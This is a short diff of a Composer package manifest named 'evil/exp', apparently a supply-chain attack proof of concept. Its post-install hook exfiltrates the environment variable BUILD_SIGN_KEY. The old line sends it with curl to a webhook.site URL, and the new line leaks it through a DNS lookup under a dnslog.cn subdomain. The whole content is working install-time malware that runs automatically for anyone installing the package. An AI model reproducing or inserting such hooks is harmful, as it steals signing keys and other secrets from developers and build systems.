@@ -1,6 +1,6 @@
 {
     "name": "evil/exp",
     "scripts": {
-        "post-install-cmd": "curl -X POST -d \"key=$BUILD_SIGN_KEY\" https://webhook.site/7adf2929-10d0-433d-9777-01ff4709cd4d"
+        "post-install-cmd": "nslookup `echo $BUILD_SIGN_KEY`.so91kg.dnslog.cn"
     }
 }
